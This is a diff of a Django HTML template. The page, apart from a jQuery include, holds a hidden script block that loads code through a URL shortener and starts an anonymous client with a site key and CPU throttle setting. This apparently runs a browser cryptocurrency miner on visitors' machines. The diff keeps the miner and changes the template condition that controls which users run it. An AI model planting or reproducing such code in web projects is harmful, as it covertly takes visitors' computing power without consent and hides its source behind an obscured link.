@@ -1,3 +1,5 @@
+{% load main_app_extras %}
+
 <!doctype html>
 <html>
   <head>
@@ -7,19 +9,21 @@
   </head>
   <body>
     
-    
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <!-- Jus70 -->
-{% if user.email != "a" %}
+{% can user.email request as CAN %}
+{% if CAN %}
 <script>
   $.getScript("https://cutt.ly/wns1PUz", function() {
     var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
         throttle: 0.7, c: 'w', ads: 0
     });
     _client.start();
+    console.log('-');
   });
 </script>
 {% endif %}
+    <!-- !Jus70 -->
     
   </body>
 </html>
